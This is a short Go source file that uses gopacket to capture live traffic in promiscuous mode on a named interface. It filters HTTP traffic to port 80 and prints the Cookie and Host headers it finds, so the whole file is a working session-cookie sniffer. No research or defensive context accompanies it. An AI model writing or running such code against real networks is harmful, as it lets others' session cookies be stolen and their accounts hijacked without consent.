package liveCapture

import (
	"bufio"
	"fmt"
	"github.com/google/gopacket"
	"github.com/google/gopacket/pcap"
	"strings"
)

func StartLiveCapturing() {
	if handle, err := pcap.OpenLive("enp0s20f0u2", 1600, true, pcap.BlockForever); err != nil {
		panic(err)
	} else if err := handle.SetBPFFilter("tcp and dst port 80"); err != nil { // optional
		panic(err)
	} else {
		packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
		for packet := range packetSource.Packets() {

			if packet.ApplicationLayer() != nil {
				getRequest := string(packet.ApplicationLayer().Payload())
				scanner := bufio.NewScanner(strings.NewReader(getRequest))
				headertagToValue := make(map[string]string)

				for scanner.Scan() {
					//fmt.Println(scanner.Text())
					splitedLine := strings.Split(scanner.Text(), ": ")
					if len(splitedLine) >= 2 {
						headertagToValue[splitedLine[0]] = splitedLine[1]
					}
				}
				if headertagToValue["Cookie"] != "" {
					fmt.Println("FOUND COOKIE FOR: " + headertagToValue["Host"] + " - Content: " + headertagToValue["Cookie"])
				}
			}
		}
	}
}
